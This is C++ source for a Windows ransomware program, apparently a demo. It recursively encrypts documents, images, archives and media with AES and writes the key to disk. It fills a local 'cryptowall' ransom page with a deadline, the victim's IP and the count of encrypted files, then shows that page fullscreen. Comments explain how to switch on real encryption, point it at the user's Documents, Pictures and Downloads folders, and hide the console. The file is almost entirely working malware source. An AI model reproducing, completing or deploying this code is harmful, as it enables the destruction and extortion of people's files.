#include <time.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fileapi.h>
#include <windows.h>

#include "aes.h"

unsigned int cant_files = 0;

bool isValidFile(char* file) {
  char* ext = strrchr(file, '.');
  if (ext == NULL) return false;
  ext++;
  return // Only encrypt file with the next extensions
  !strcmp(ext, "doc") || !strcmp(ext, "pdf") || !strcmp(ext, "rar") || 
  !strcmp(ext, "bmp") || !strcmp(ext, "gif") || !strcmp(ext, "jpg") || 
  !strcmp(ext, "mp3") || !strcmp(ext, "mp4") || !strcmp(ext, "avi") || 
  !strcmp(ext, "txt") || !strcmp(ext, "zip") || !strcmp(ext, "png") || 
  !strcmp(ext, "mkv") || !strcmp(ext, "ppt") || !strcmp(ext, "xls")  ;
}

void EncryptFile(char* fname, const uint8_t* key) {
  if (!isValidFile(fname)) return;
  printf("%s\n", fname);
  cant_files++;
  FILE* file = fopen(fname, "rb+");
  fseek(file, 0, SEEK_END);
  uint32_t size = ftell(file);

  // ANSI X9.23 Start
  uint8_t len = AES_BLOCKLEN - size % AES_BLOCKLEN;
  uint8_t* pad = new uint8_t[len];
  for (uint8_t i = 0; i < len - 1; i++)
    pad[i] = 0x00;
  pad[len - 1] = len;
  fwrite(pad, sizeof(uint8_t), len, file);
  delete[] pad;
  size += len;
  // ANSI X9.23 End

  rewind(file);
  uint8_t* input = new uint8_t[size];
  fread(input, 1, size, file);

  AES_encrypt(key, input, size);

/// COMMENT THE NEXT THREE LINES TO ENCRYPT FILES!!!
  AES_decrypt(key, input, size);
  uint32_t del = input[size - 1];
  size -= del;
/**/
  fwrite(input, sizeof(uint8_t), size, file);
  delete[] input;
  fclose(file);
}

void SearchFiles(const char* sDir, const uint8_t* key) {
    WIN32_FIND_DATA fdFile;
    HANDLE hFind = NULL;
    char sPath[512];
    sprintf(sPath, "%s\\*.*", sDir); // Search all files
    hFind = FindFirstFile(sPath, &fdFile);
    do {
        if (strcmp(fdFile.cFileName, ".") != 0 && strcmp(fdFile.cFileName, "..") != 0) {
            //Build up file path
            sprintf(sPath, "%s\\%s", sDir, fdFile.cFileName);
            // Is the entity a File or Folder?
            if (fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                SearchFiles(sPath, key); // Recursion
            else
                EncryptFile(sPath, key);
        }
    } while (FindNextFile(hFind, &fdFile)); // Find the next file
    FindClose(hFind); // Clean
}

int main() {
  /// HIDE CONSOLE
  // Delete the next two slashes to hide console:
  //FreeConsole();

  /// GENERATE KEY
  uint8_t key[32];
  time_t seed = time(NULL);
  srand(seed);
  for (uint8_t i = 0; i < 32; i++)
    key[i] = rand() % 256;

  FILE* kfile = fopen("key.bin", "wb");
  fwrite(key, sizeof(uint8_t), 32, kfile);
  fclose(kfile);

  /// ENCRYPT FILES
  // Encrypt Files in this folders and subfolders:
  SearchFiles("testfolder", key);
  //SearchFiles("C:\\Users\\User\\Music", key);
  //SearchFiles("C:\\Users\\User\\Videos", key);
  //SearchFiles("C:\\Users\\User\\Pictures", key);
  //SearchFiles("C:\\Users\\User\\Documents", key);
  //SearchFiles("C:\\Users\\User\\Downloads", key);

  /// GET TIME OF TOMORROW
  const int timediff = -8; // php time is 8 less that localtime
  time_t time = seed + (24 + timediff) * 60 *60;
  tm* timeinfo = localtime(&time);
  unsigned int year = timeinfo->tm_year + 1900;
  unsigned int month = timeinfo->tm_mon + 1;

  /// ADD DATE TO FILE
  FILE* cryptowall = fopen("C:\\xampp\\htdocs\\cryptowall\\index.php", "r+");
  fseek(cryptowall, 96, SEEK_SET);
  fprintf(cryptowall, "%02u-%02u-%02u %02u:%02u:%02u", year, month,
          timeinfo->tm_mday, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);

  /// GET IP
  unsigned int ip[4];
  system("getip.bat"); // it's the local ip, Opera close his ftp server to test ips
  FILE* loadip = fopen("ip", "r+");
  fscanf(loadip, "%u.%u.%u.%u", &ip[0], &ip[1], &ip[2], &ip[3]);
  fclose(loadip);

  /// ADD IP
  fseek(cryptowall, 1164, SEEK_SET);
  // ip may have different lengths: 0.0.0.0 / 255.255.255.255, pad with spaces
  char buffer[16] = "               ";
  int pad = sprintf(buffer, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
  buffer[pad] = ' '; // Remove '\0' set by sprintf
  fwrite(buffer, sizeof(char), 15, cryptowall);

  /// ADD Total Files Encrypted
  fseek(cryptowall, 1332, SEEK_SET);
  fprintf(cryptowall, "%1u,%03u", cant_files / 1000, cant_files % 1000);
  fclose(cryptowall);

  /// SHOW MESSAGE FULLSCREEN
  system("start /b cmd /c \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -new-window localhost/cryptowall/");
  system("fullscreen.vbs");
  return 0;
}
